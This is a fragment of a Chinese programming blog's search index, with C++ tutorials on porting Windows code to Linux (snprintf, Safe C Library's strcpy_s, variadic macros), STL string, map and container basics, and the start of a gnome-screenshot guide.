ncurses 的项目代码，不同构建工具的使用说明如下： 若使用 G++ 编译 C++ 项目，则编译命令的示例如下： 12# 编译代码$ g++ main.cpp -o main -lncurses 若使用 CMake 构建 C++ 项目，则 CMakeLists.txt 配置文件的示例内容如下： 123set(CMAKE_CXX_FLAGS "-std=c++11 -lncurses")add_executable(main main.cpp) itoa () 函数移植简述在 Window 平台里，itoa() 函数可以将整数转换为字符串，其函数的原型如下。Linux 平台中只有 atoi() 函数，并没有对应的 itoa() 函数，但可以使用 sprintf() 或者 snprintf() 函数替代，建议使用更安全的 snprintf()。 itoa () 函数 函数原型：char *itoa( int value, char *string,int radix) 函数功能：将整数 value 转换成字符串存入 string 指向的内存空间，radix 为转换时所用基数 (保存到字符串中的数据的进制基数) 函数的参数：value：转换的数据，string：目标字符串的地址，radix：转换后的进制数，可以是 10 进制、16 进制等，范围必须在 2-36 之间 snprintf () 函数 头文件：#include &lt;stdio.h&gt; 函数原型：int snprintf(char *str, size_t size, const char *format, ...) 函数功能：将可变参数 ... 按照 format 格式化成字符串，然后将其复制到 str 中 函数参数：str：目标字符串，size：拷贝字节数（Bytes），format：格式化字符串，... 可变参数 案例代码1234567891011#include &lt;iostream&gt;using namespace std;int main() { int num = 12; char str[4]; int size = snprintf(str, 4, "%d", num); cout &lt;&lt; "str = " &lt;&lt; str &lt;&lt; ", size = " &lt;&lt; size &lt;&lt; endl; return 0;} 程序运行的输出结果如下： 1str = 12, size = 2 strcpy_s () 函数相关站点 Safe C Library 的下载页面 Safe C Library 的官方文档 Safe C Library 的 GitHub 项目 移植简述在 Window 平台上，strcpy_s() 函数存在于 #include &lt;cstring&gt; 头文件中。Linux 平台没有该函数，但可以使用 Safe C Library 替代实现。Safe C Library 这个库是在 libc 的基础之上实现了安全的 C11 Annex K 函数，这些函数是它们所缺少的，可以帮助缓解不断增加的安全攻击，特别是缓冲区溢出。 安装依赖提示 由于 Safe C Library 不是 Linux 系统默认的库，因此需要安装后才能使用，其默认的安装目录如下 /usr/local/lib/：包含静态库和动态链接库文件 /usr/local/include/libsafec：包所有含头文件 1234567891011121314151617# 下载文件（这里下载的不是源码压缩包）# wget https://github.com/rurban/safeclib/releases/download/v02092020/libsafec-02092020.tar.gz# 解压文件# tar -xvf libsafec-02092020.tar.gz# 进入解压目录# cd libsafec-02092020.0-g6d921f# 配置# ./configure# 编译# make -j4# 安装# make install 值得一提的是，Safe C Library 编译后会单独生成静态库文件 /usr/local/lib/libsafec-3.6.0.a 和动态链接库文件 /usr/local/lib/libsafec-3.6.0.so.3.0.6，其中的 3.6.0 是指版本号。 案例代码提示 strcpy_s() 函数在 Safe C Library 里的 safe_str_lib.h 头文件中声明 123456789101112#include &lt;iostream&gt;#include &lt;libsafec/safe_str_lib.h&gt;using namespace std;int main() { char *str = new char[5]; strcpy_s(str, 5, "abcd"); cout &lt;&lt; str &lt;&lt; endl; delete[] str; return 0;} 编译说明由于 Safe C Library 不是 Linux 系统默认的库，因此编译时需要链接到该库，同时还需要在 C++ 的源文件里添加头文件 &lt;libsafec/safe_str_lib.h&gt;，否则编译会失败。 提示 为了可以正常编译使用了 Safe C Library 的项目代码，不同构建工具的使用说明如下所示 可以将上面构建生成的 libsafec-3.6.0.a 静态库文件和 .h 头文件都拷贝到项目里，这样就可以方便在不同的 Linux 系统编译和运行项目，不用每次切换系统时都要重新安装 Safe C Library 若使用 G++ 编译 C++ 项目，则编译命令的示例如下，请自行更改库文件的版本号： 12345# 编译代码$ g++ main.cpp -o main -L/usr/local/lib/ -l:libsafec-3.6.0.a# "-L" 参数指定了库文件的目录路径# "-l:" 参数指定了库文件的文件名 若使用 CMake 构建 C++ 项目，则 CMakeLists.txt 配置文件的示例内容如下，请自行更改库文件的版本号： 123link_libraries(/usr/local/lib/libsafec-3.6.0.a)add_executable(windows_to_linux main.cpp) 函数可变参数宏移植简述在 Windows 平台与 Linux 平台，函数可变参数宏定义的语法是不一样的。 案例代码 Windows 平台的函数可变参数宏定义的写法如下，使用的是 __VA_ARGS__ 12FILE* logfile = fopen("syslog.txt", "w");#define LOG(format, ...) fprintf(logfile, format, __VA_ARGS__); printf(format, __VA_ARGS__); fflush(logfile); Linux 平台的函数可变参数宏定义写法如下，使用的是 ##__VA_ARGS__ 12FILE* logfile = fopen("syslog.txt", "w");#define LOG(format, ...) fprintf(logfile, format, ##__VA_ARGS__); printf(format, ##__VA_ARGS__); fflush(logfile); var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"c++ linux系统编程"},{title:"C++ 进阶基础之六",url:"/posts/62e4578b.html",text:'string 容器的概念string 是 STL 的字符串类型，通常用来表示字符串。而在使用 string 之前，字符串通常是用 char* 表示的。string 与 char* 都可以用来表示字符串，两者的区别如下： string 是一个类，char* 是一个指向字符的指针 string 封装了 char* 来管理字符串，本质是一个 char* 类型的容器 string 不用考虑内存释放和越界的问题 string 负责管理 char* 所分配的内存。每一次 string 的复制，取值都由 string 类负责维护，不用担心复制越界和取值越界等问题 string 提供了一系列的字符串操作函数，例如：查找（find）、拷贝（copy）、删除（erase）、替换（replace）、插入（insert） stirng 容器的 API构造函数 默认构造函数：string(); 带参数的构造函数： string(const char *s);，用字符串 s 初始化 string(int n, char c);，用 n 个字符 c 初始化 拷贝构造函数：string(const string &amp;str); string 的长度 size_t size() const，返回当前字符串的长度，这里的长度不包括字符串的结尾的 \\0 字符 size_t length() const;，返回当前字符串的长度，这里的长度不包括字符串的结尾的 \\0 字符 bool empty() const;，判断当前字符串是否为空 值得一提的是，sizeof() 返回的是对象所占用空间的字节数，strlen() 返回的是字符数组中第一个 \\0 前的字节数，string 的成员函数 size() 和 length() 没有任何区别。 string 的赋值 string &amp;operator=(const string &amp;s);，把字符串 s 赋给当前的字符串 string &amp;assign(const char *s);，把字符串 s 赋给当前的字符串 string &amp;assign(const char *s, int n);，把字符串 s 的前 n 个字符赋给当前的字符串 string &amp;assign(const string &amp;s);，把字符串 s 赋给当前字符串 string &amp;assign(int n, char c);，用 n 个字符 c 赋值给当前字符串 string &amp;assign(const string &amp;s, int start, int n);，把字符串 s 中从 start 开始的 n 个字符赋值给当前字符串 string 的子串 string substr(int pos=0, int n=npos) const;，返回由 pos 位置开始的 n 个字符组成的子字符串 string 的查找 int find(char c, int pos=0) const;，从 pos 位置开始查找字符 c 在当前字符串第一次出现的位置 int find(const char *s, int pos=0) const;，从 pos 位置开始查找字符串 s 在当前字符串第一次出现的位置 int find(const string &amp;s, int pos=0) const;，从 pos 位置开始查找字符串 s 在当前字符串第一次出现的位置 int rfind(char c, int pos=npos) const;，从 pos 位置开始查找字符 c 在当前字符串中最后一次出现的位置 int rfind(const char *s, int pos=npos) const;，从 pos 位置开始查找字符串 s 在当前字符串中最后一次出现的位置 int rfind(const string &amp;s, int pos=npos) const;，从 pos 位置开始查找字符串 s 在当前字符串中最后一次出现的位置 值得一提的是，当 find() 与 rfind() 函数查找不到时，都会返回 -1；两者不同的是 find() 是正向查找，而 rfind() 是逆向查找，但是最终两个函数返回的位置均是字符 / 字符串出现的正向位置；若有重复字符 / 字符串时，则 rfind() 返回的是逆向查找到的字符 / 字符串在正向的位置（即最后一次出现的正向位置）。 string 的替换 string &amp;replace(int pos, int n, const char *s);，删除从 pos 位置开始的 n 个字符，然后在 pos 位置插入字符串 s string &amp;replace(int pos, int n, const string &amp;s);，删除从 pos 位置开始的 n 个字符，然后在 pos 位置插入字符串 s void swap(string &amp;s2);，交换当前字符串与字符串 s2 的值 string 的比较 int compare(const string &amp;s) const;，与字符串 s 比较 int compare(const char *s) const;，与字符串 s 比较 compare() 函数的结果在 &gt; 时返回 1，&lt; 时返回 -1，= 时返回 0。字符串比较区分大小写，比较时参考字典顺序，排越前面的越小。大写的 A（65） 比小写的 a（97） 小。 string 的字符存储 char &amp;at(int n); char &amp;operator[] (int n); operator[] 和 at() 均返回当前字符串中的第 n 个字符，但二者是有区别的 at() 在越界时会抛出异常，[] 在刚好越界时会返回 (char)0，再继续越界时，程序异常终止 如果程序希望可以通过 try catch 捕获异常，则建议采用 at() string 的区间插入 string &amp;insert(int pos, const char *s);，在 pos 位置插入字符串 s，返回修改后的字符串 string &amp;insert(int pos, const string &amp;s);，在 pos 位置插入字符串 s，返回修改后的字符串 string &amp;insert(int pos, int n, char c);，在 pos 位置插入 n 个字符 c，返回修改后的字符串 string 的区间删除 string &amp;erase(int pos=0, int n=npos);，删除从 pos 位置开始的 n 个字符，返回修改后的字符串 string 的字符串拼接 string &amp;operator+=(const string &amp;s);，把字符串 s 连接到当前字符串的结尾 string &amp;operator+=(const char *s);，把字符串 s 连接到当前字符串的结尾 string &amp;append(const char *s); ，把字符串 s 连接到当前字符串的结尾 string &amp;append(const char *s, int n);，把字符串 s 的前 n 个字符连接到当前字符串的结尾 string &amp;append(const string &amp;s); ，把字符串 s 连接到当前字符串的结尾 string &amp;append(const string &amp;s, int pos, int n);，把字符串 s 中从 pos 位置开始的 n 个字符连接到当前字符串的结尾 string &amp;append(int n, char c); ，在当前字符串的结尾添加 n 个字符 c 从 string 取得 char* const char *c_str() const;，返回一个以 \\0 结尾的字符串的首地址 值得一提的是，char * 可以隐式转换为 string 类型，反过来则不可以，例如右边这种写法是合法的： char *p = "abc"; string str = p; 将 string 拷贝到 char* 指向的内存空间 int copy(char *s, int n, int pos=0) const; 将当前串中以 pos 位置开始的 n 个字符拷贝到以 s 为起始位置的字符数组中，返回实际拷贝的字符数量。特别注意，要保证指针 s 所指向的内存空间足以容纳当前的字符串，不然可能会发生越界。 string 容器的使用 ★点击显示完整的示例代码★ string 容器的构造与赋值 123456789101112131415161718192021222324252627#include &lt;iostream&gt;using namespace std;int main() { // 默认构造函数 string str1; // 拷贝构造函数 string str2 = str1; // 有参构造函数 string str3("abced"); string str4(5, \'f\'); // 基本赋值 str1 = "123456"; str2 = str3; str3.assign("mnopq", 3); str4.assign("45678", 1, 3); // 从0开始索引，1表示第2个字符 cout &lt;&lt; "str1 = " &lt;&lt; str1 &lt;&lt; endl; cout &lt;&lt; "str2 = " &lt;&lt; str2 &lt;&lt; endl; cout &lt;&lt; "str3 = " &lt;&lt; str3 &lt;&lt; endl; cout &lt;&lt; "str4 = " &lt;&lt; str4 &lt;&lt; endl; return 0;} 程序运行输出的结果如下： 1234str1 = 123456str2 = abcedstr3 = mnostr4 = 567 string 容器的 API 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#include &lt;iostream&gt;using namespace std;int main() { // 存储字符 string str1 = "abcde"; for (int i = 0; i &lt; str1.size(); i++) { // 第一种方式 cout &lt;&lt; str1[i] &lt;&lt; " "; // 第二种方式 // cout &lt;&lt; str1.at(i) &lt;&lt; " "; } cout &lt;&lt; endl; // 字符串拼接 string str2 = "hello "; string str3 = "world "; str2 += str3; str3.append("where"); cout &lt;&lt; "str2 = " &lt;&lt; str2 &lt;&lt; endl; cout &lt;&lt; "str3 = " &lt;&lt; str3 &lt;&lt; endl; // 字符串查找 string str4 = "My name is Peter"; int index1 = str4.find("name"); cout &lt;&lt; "index1 = " &lt;&lt; index1 &lt;&lt; endl; int index2 = str4.rfind("e"); cout &lt;&lt; "index2 = " &lt;&lt; index2 &lt;&lt; endl; // 字符串替换 string str5 = "abc123"; str5.replace(3, 3, "def"); cout &lt;&lt; "str5 = " &lt;&lt; str5 &lt;&lt; endl; string str6 = "123456"; string str7 = "654321"; str6.swap(str7); cout &lt;&lt; "str6 = " &lt;&lt; str6 &lt;&lt; endl; // 字符串比较 string str8 = "ABC"; string str9 = "abc"; int result = str8.compare(str9); // 返回值小于等于-1 cout &lt;&lt; "result = " &lt;&lt; result &lt;&lt; endl; // 截取子字符串 string str10 = "124abc"; string str11 = str10.substr(1, 3); cout &lt;&lt; "str11 = " &lt;&lt; str11 &lt;&lt; endl; // 字符串的区间插入 string str12 = "abcdef"; str12.insert(2, "123"); cout &lt;&lt; "str12 = " &lt;&lt; str12 &lt;&lt; endl; // 字符串的区间删除 string str13 = "123456"; str13.erase(2, 2); cout &lt;&lt; "str13 = " &lt;&lt; str13 &lt;&lt; endl; // 从字符串取得 char * string str14 = "hijkl"; const char *p1 = str14.c_str(); cout &lt;&lt; "p1 = " &lt;&lt; p1 &lt;&lt; endl; // char * 隐式类型转换为 string char *p2 = "abc123"; string str15 = p2; cout &lt;&lt; "str15 = " &lt;&lt; str15 &lt;&lt; endl; // 将 string 拷贝到 char* 指向的内存空间 char *p3 = new char[3]; string str16 = "hello jim"; int number = str16.copy(p3, 3, 2); cout &lt;&lt; "number = " &lt;&lt; number &lt;&lt; endl; cout &lt;&lt; "p3 = " &lt;&lt; p3 &lt;&lt; endl; delete[] p3; return 0;} 程序运行输出的结果如下： 123456789101112131415a b c d e str2 = hello world str3 = world whereindex1 = 3index2 = 14str5 = abcdefstr6 = 654321result = -32str11 = 24astr12 = ab123cdefstr13 = 1256p1 = hijklstr15 = abc123number = 3p3 = llo map 容器的使用 ★点击显示完整的示例代码★ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#include &lt;iostream&gt;#include &lt;map&gt;using namespace std;int main() { // 定义Map集合变量 map&lt;int, int&gt; m; // 第一种数据插入方式 m.insert(pair&lt;int, int&gt;(1, 2)); // 第二种数据插入方式（推荐） m.insert(make_pair(3, 4)); // 第三种数据插入方式 m.insert(map&lt;int, int&gt;::value_type(5, 6)); // 第四种数据插入方式 m[7] = 8; // 第一种方式遍历Map集合 for (map&lt;int, int&gt;::iterator it = m.begin(); it != m.end(); it++) { cout &lt;&lt; "key = " &lt;&lt; it-&gt;first &lt;&lt; " , " &lt;&lt; it-&gt;second &lt;&lt; endl; } cout &lt;&lt; endl; // 第二种方式遍历Map集合 for (auto it = m.begin(); it != m.end(); it++) { cout &lt;&lt; "key = " &lt;&lt; it-&gt;first &lt;&lt; " , value = " &lt;&lt; it-&gt;second &lt;&lt; endl; } cout &lt;&lt; endl; // 获取指定的Key map&lt;int, int&gt;::iterator item = m.find(5); cout &lt;&lt; "key = " &lt;&lt; item-&gt;first &lt;&lt; " , value = " &lt;&lt; item-&gt;second &lt;&lt; endl; cout &lt;&lt; endl; // 第一种方式判断Key是否存在 // 如果Key存在，find()函数会返回Key对应的迭代器，如果Key不存在，find()函数会返回尾后迭代器end() if (m.find(100) == m.end()) { cout &lt;&lt; "key " &lt;&lt; 100 &lt;&lt; " not exist" &lt;&lt; endl; } cout &lt;&lt; endl; // 第二种方式判断Key是否存在 // count()函数用于统计Key值在Map中出现的次数，Map的Key是不允许重复的，因此如果Key存在会返回1，不存在会返回0 if (m.count(5) == 1) { cout &lt;&lt; "key " &lt;&lt; 5 &lt;&lt; " existed" &lt;&lt; endl; } cout &lt;&lt; endl; // 删除指定的Key m.erase(7); for (auto it = m.begin(); it != m.end(); it++) { cout &lt;&lt; "key = " &lt;&lt; it-&gt;first &lt;&lt; " , value = " &lt;&lt; it-&gt;second &lt;&lt; endl; }} 程序运行输出的结果如下： 12345678910111213141516171819key = 1 , 2key = 3 , 4key = 5 , 6key = 7 , 8key = 1 , value = 2key = 3 , value = 4key = 5 , value = 6key = 7 , value = 8key = 5 , value = 6key 100 not existkey 5 existedkey = 1 , value = 2key = 3 , value = 4key = 5 , value = 6 参考资料 C++ 中 string 成员函数 length ()、size () 与 strlen () 的区别 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"c++"},{title:"C++ 进阶基础之五",url:"/posts/64fd9f88.html",text:'基本概念模板的基本概念模板是实现代码重用机制的一种重要工具，其本质是类型参数化，即把类型定义为参数。C++ 提供了类模板和函数模板，详细的使用可参考教程：C++ 进阶基础之二 类模板的简介 类模板的本质就是建立一个通用类，其成员变量的类型、成员函数的返回类型和参数类型都可以不具体指定，而用虚拟的类型来替代 当使用类模板建立对象时，编译器会根据实参的类型取代类模板中的虚拟类型，从而实现不同类的功能 函数模板的简介 函数模板就是建立一个通用的函数，其函数返回类型和形参类型不具体指定，而是用虚拟的类型来替代 凡是函数体相同的函数都可以用函数模板来代替，不必定义多个函数，只需在模板中定义一次即可 在调用函数时，编译器会根据实参的类型来取代模板中的虚拟类型，从而实现不同函数的功能 STL 的基本概念STL 的简介STL（Standard Template Library，标准模板库）是惠普实验室开发的一系列软件的统称。现然主要出现在 C++ 中，但在被引入 C++ 之前该技术就已经存在了很长的一段时间。STL 的从广义上讲分为三类：Algorithm（算法）、Container（容器）和 Iterator（迭代器），容器和算法通过迭代器可以进行无缝地连接。几乎所有的 STL 代码都采用了类模板和函数模板的方式编写，这相比于传统的由类和函数组成的库来说提供了更好的代码重用机会。从逻辑层次来看，在 STL 中体现了泛型化程序设计的思想（Generic Programming），在这种思想里，大部分的基本算法被抽象和被泛化，独立于与之对应的数据结构，用于以相同或相近的方式处理各种不同情形。从实现层次看，整个 STL 是以一种类型参数化（Type Parameterized）的方式实现的，本质是基于模板（Template）。在 C++ 标准中，STL 被组织为下面的 13 个头文件：&lt;algorithm&gt;、&lt;deque&gt;、&lt;functional&gt;、&lt;iterator&gt;、&lt;vector&gt;、&lt;list&gt;、&lt;map&gt;、&lt;memory&gt;、&lt;numeric&gt;、&lt;queue&gt;、&lt;set&gt;、&lt;stack&gt; 、&lt;utility&gt;。 STL 的优势 STL 是 C++ 的一部分，因此不用额外安装什么就可以直接使用，因为它被内建在编译器之内 STL 的一个重要特点是数据结构和算法的分离，尽管这是个简单的概念，但是这种分离使 STL 变得非常通用 开发人员一般可以不用思考 STL 具体的实现过程，只要能够熟练使用 STL 就可以了，这样可以把精力放在程序开发的其他方面 STL 具有高可重用性、高性能、高移植性、跨平台的优点 高移植性：如在项目 A 上使用 STL 编写的模块，可以直接移植到项目 B 上 跨平台：如用 Windows 的 Visual Studio 编写的代码，可以在 Mac OS 的 XCode 上直接编译 高性能：如 map 可以高效地从十万条记录里面查找出指定的记录，因为 map 是采用红黑树的变体实现的（红黑树是平横二叉树的一种） 高可重用性：STL 中几乎所有的代码都采用了类模板和函数模板的方式实现，这相比于传统的由函数和类组成的库来说提供了更好的代码重用机会 STL 的六大组件 容器（Containers）：各种数据结构，如 vector、list、deque、set、map 用来存放数据，STL 容器是一种类模板。 算法（Algorithms）：各种常用算法如 sort、search、copy、erase，从实现的角度来看，STL 算法是一种函数模板。 迭代器（Iterators）：扮演容器与算法之间的胶合剂，是所谓的 泛型指针，共有五种类型，以及其它衍生变体。从实现的角度来看，迭代器是一种将 Operators*、Operator-&gt;、Operator++、Operator-- 等相关操作予以重载的类模板。所有 STL 容器都附带有自己专属的迭代器，原生指针（Native pointer）也是一种迭代器。 仿函数（Functors）： 行为类似函数，可作为算法的某种策略（Policy），从实现的角度来看，仿函数是一种重载了 Operator() 的类或者类模板。一般函数指针可视为狭义的仿函数。 适配器（Adapters）：一种用来修饰容器（Containers）或仿函数（Functors）或迭代器（Iterators）接口的东西，例如：STL 提供的 Queue 和 Stack，虽然看似容器，但只能算是一种容器适配器，因为它们的底层完全借助 Deque，所有操作都由底层的 Deque 提供。改变 Functor 接口者，称为 Function Adapter；改变 Container 接口者，称为 Container Adapter；改变 Iterator 接口者，称为 Iterator Adapter。适配器的实现技术很难一言蔽之，必须逐一分析。 空间配置器（Allocators）：负责空间配置与管理，从实现的角度来看，配置器是一个实现了动态空间配置、空间管理、空间释放的类模板。 容器的基本概念在实际的开发过程中，数据结构本身的重要性不会逊于操作数据结构的算法的重要性，当程序中存在着对执行效率要求很高的部分时，数据结构的选择就显得更加重要。经典的数据结构数量有限，但是常常重复着一些为了实现向量、链表等结构而编写的代码，这些代码都十分相似，只是为了适应不同数据的变化而在细节上有所不同。STL 容器为此提供了这样的方便，它允许重复利用已有的实现构造自己的特定类型下的数据结构，通过设置一些模板，STL 容器对最常用的数据结构提供了支持，这些模板的参数允许指定容器中元素的数据类型，可以将许多重复而乏味的工作简化。容器部分主要由头文件 &lt;vector&gt;、&lt;list&gt;、&lt;deque&gt;、&lt;set&gt;、&lt;map&gt;、&lt;stack&gt;、&lt;queue&gt; 组成。对于常用的一些容器和容器适配器（可以看作由其它容器实现的容器），可以通过下表总结不同容器与相应头文件的对应关系。 容器 描述 实现头文件 向量 (vector) 连续内存的元素 &lt;vector&gt; 列表 (list) 由节点组成的双向链表，每个结点包含着一个元素 &lt;list&gt; 双队列 (deque) 连续内存的指向不同元素的指针所组成的数组 &lt;deque&gt; 集合 (set) 由节点组成的红黑树，每个节点都包含着一个元素，节点之间以某种作用于元素对的谓词排列，没有两个不同的元素能够拥有相同的次序 &lt;set&gt; 多重集合 (multiset) 允许存在两个次序相等的元素的集合 &lt;set&gt; 栈 (stack) 先进后出的值的排列 &lt;stack&gt; 队列 (queue) 先进先出的执的排列 &lt;queue&gt; 优先队列 (priority_queue) 元素的次序是由作用于所内存的值对上的某种谓词决定的一种队列 &lt;queue&gt; 映射 (map) 由 {键，值} 对组成的集合，以某种作用于键对上的谓词排列 &lt;map&gt; 多重映射 (multimap) 允许键对有相等的次序的映射 &lt;map&gt; 容器的简介容器可以用来管理一组元素，如下图所示： 容器的分类 序列式容器（Sequence Containers）：每个元素都有固定的位置，取决于插入时机和地点，与元素的值无关，如 vector、deque、list 关联式容器（Associated Containers）：元素位置取决于特定的排序规则，与插入的顺序无关，如 set、multiset、map、multimap 算法的基本概念算法的简介函数库对数据类型的选择对其可重用性起着至关重要的作用。举例来说，一个求方根的函数，在使用浮点数作为其参数类型的情况下的可重用性肯定比使用整型作为它的参数类性要高。而 C++ 通过模板的机制允许推迟对某些类型的选择，直到真正想使用模板或者说对模板进行特化的时候，STL 就利用了这一点提供了相当多的算法。它是在一个有效的框架中完成这些算法的 —— 可以将所有的类型划分为少数的几类，然后就可以在模板的参数中使用一种类型替换掉同一种类中的其他类型。 算法的头文件STL 提供了大约 100 个实现算法的函数模板，比如算法 for_each 将为指定序列中的每一个元素调用指定的函数，stable_sort 以调用者所指定的规则对序列进行稳定性排序等等。这样一来，只要熟悉了 STL 之后，许多代码可以被大大地简化，只需要通过调用一两个算法模板，就可以完成所需要的功能。算法主要由头文件 &lt;algorithm&gt;、&lt;numeric&gt;、&lt;functional&gt; 组成。&lt;algorithm&gt; 是所有 STL 头文件中最大的一个，它是由一大堆函数模板组成的，可以认为每个函数在很大程度上都是独立的，其中常用到的功能范围涉及到比较、交换、查找、遍历、复制、修改、移除、反转、排序、合并操作等。&lt;numeric&gt; 的体积很小，只包括几个在序列上面进行简单数学运算的函数模板，包括加法和乘法在序列上的一些操作。&lt;functional&gt; 中则定义了一些类模板，用来声明函数对象。 迭代器的基本概念迭代器从作用上来说是最基本的部分。软件设计有一个基本原则，所有的问题都可以通过引进一个间接层来简化，这种简化在 STL 中就是用迭代器来完成的。概括来说，迭代器在 STL 中用来将算法和容器联系起来，起着一种黏和剂的作用。几乎 STL 提供的所有算法都是通过迭代器存取元素序列进行工作的，每一个容器都定义了其本身所专有的迭代器，用以存取容器中的元素。迭代器主要由头文件 &lt;utility&gt;、&lt;iterator&gt;、&lt;memory&gt; 组成。其中 &lt;utility&gt; 是一个很小的头文件，它包括了贯穿使用在 STL 中的几个模板的声明，&lt;iterator&gt; 中提供了迭代器 使用的许多方法，而对于 &lt;memory&gt; 描述起来则十分的困难，它以不同寻常的方式为容器中的元素分配内存空间，同时也为某些算法在执行期间产生的临时对象提供管理机制，&lt;memory&gt; 中最主要的是类模板 allocator，它负责产生所有容器的默认空间配置器（分配器）。 初识容器的使用指针是一种迭代器1234567891011121314#include &lt;iostream&gt;using namespace std;int main() { int array[5] = {1, 2, 3, 4, 5}; int length = sizeof(array) / sizeof(int); int *p = array; for (int i = 0; i &lt; length; i++) { cout &lt;&lt; *(p++) &lt;&lt; " "; } return 0;} 程序运行输出的结果如下： 11 2 3 4 5 容器存放基础数据类型12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;using namespace std;void m_print(const int num) { cout &lt;&lt; num &lt;&lt; " ";}int main() { // 定义容器 vector&lt;int&gt; v; // 插入数据 v.push_back(11); v.push_back(12); v.push_back(13); v.push_back(14); v.push_back(15); // 第一种方式：遍历容器 vector&lt;int&gt;::iterator itBegin = v.begin(); vector&lt;int&gt;::iterator itEnd = v.end(); while (itBegin != itEnd) { cout &lt;&lt; *(itBegin++) &lt;&lt; " "; } cout &lt;&lt; endl; // 第二种方式：遍历容器 for (vector&lt;int&gt;::iterator it = v.begin(); it != v.end(); it++) { cout &lt;&lt; *it &lt;&lt; " "; } cout &lt;&lt; endl; // 第三种方式：遍历容器 for_each(v.begin(), v.end(), m_print); return 0;} 程序运行输出的结果如下： 12311 12 13 14 15 11 12 13 14 15 11 12 13 14 15 容器存放自定义数据类型123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;class Person {public: Person(int age, string name) { this-&gt;age = age; this-&gt;name = name; } int getAge() { return this-&gt;age; } string getName() { return this-&gt;name; }private: int age; string name;};int main() { Person p1(23, "Jim"); Person p2(26, "Tom"); Person p3(29, "Peter"); // 定义容器 vector&lt;Person&gt; v; // 插入数据 v.push_back(p1); v.push_back(p2); v.push_back(p3); // 遍历容器 for (vector&lt;Person&gt;::iterator it = v.begin(); it != v.end(); it++) { cout &lt;&lt; "age = " &lt;&lt; it-&gt;getAge() &lt;&lt; ", name = " &lt;&lt; it-&gt;getName() &lt;&lt; endl; // 或者 // cout &lt;&lt; "age = " &lt;&lt; (*it).getAge() &lt;&lt; ", name = " &lt;&lt; (*it).getName() &lt;&lt; endl; } return 0;} 程序运行输出的结果如下： 123age = 23, name = Jimage = 26, name = Tomage = 29, name = Peter 容器存放自定义数据类型的指针1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;class Person {public: Person(int age, string name) { this-&gt;age = age; this-&gt;name = name; } int getAge() { return this-&gt;age; } string getName() { return this-&gt;name; }private: int age; string name;};int main() { // 定义容器 vector&lt;Person *&gt; v; // 插入数据 v.push_back(new Person(23, "Jim")); v.push_back(new Person(26, "Tom")); v.push_back(new Person(29, "Peter")); // 遍历容器 for (vector&lt;Person *&gt;::iterator it = v.begin(); it != v.end(); it++) { cout &lt;&lt; "age = " &lt;&lt; (*it)-&gt;getAge() &lt;&lt; ", name = " &lt;&lt; (*it)-&gt;getName() &lt;&lt; endl; // 或者 // cout &lt;&lt; "age = " &lt;&lt; (**it).getAge() &lt;&lt; ", name = " &lt;&lt; (**it).getName() &lt;&lt; endl; } return 0;} 程序运行输出的结果如下： 123age = 23, name = Jimage = 26, name = Tomage = 29, name = Peter 容器之间的嵌套使用12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;int main() { // 定义容器 vector&lt;int&gt; v1; vector&lt;int&gt; v2; vector&lt;int&gt; v3; vector&lt;vector&lt;int&gt;&gt; v; // 插入数据 for (int i = 0; i &lt; 5; i++) { v1.push_back(i + 1); v2.push_back(i + 6); v3.push_back(i + 11); } v.push_back(v1); v.push_back(v2); v.push_back(v3); // 遍历容器 for (vector&lt;vector&lt;int&gt;&gt;::iterator it1 = v.begin(); it1 != v.end(); it1++) { for (vector&lt;int&gt;::iterator it2 = (*it1).begin(); it2 != (*it1).end(); it2++) { cout &lt;&lt; *it2 &lt;&lt; " "; } cout &lt;&lt; endl; } return 0;} 程序运行输出的结果如下： 1231 2 3 4 5 6 7 8 9 10 11 12 13 14 15 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"c++"},{title:"Linux 屏幕截图和剪贴板命令行工具",url:"/posts/9eb6789a.html",text:'前言版本说明 xclip：0.13 gnome-screenshot：3.26.0 截图工具gnome-screenshot 是一款 GNOME 命令行工具，它是一款用来对整个屏幕、一个特定的窗口或者用户所定义一些其他区域进行捕获的工具。该工具提供了几个其他的功能，包括对所捕获的截图的边界进行美化的功能。值得一提的是，gnome-screenshot 不适用于 KDE、Xfce 等 Linux 桌面环境。 截图工具的使用1234567891011121314# 捕捉整个屏幕$ gnome-screenshot# 捕捉当前Shell窗口$ gnome-screenshot -w# 捕捉指定区域$ gnome-screenshot -a# 延迟捕捉屏幕$ gnome-screenshot -d 5# 捕捉当前Shell窗口，并去除窗口的边框$ 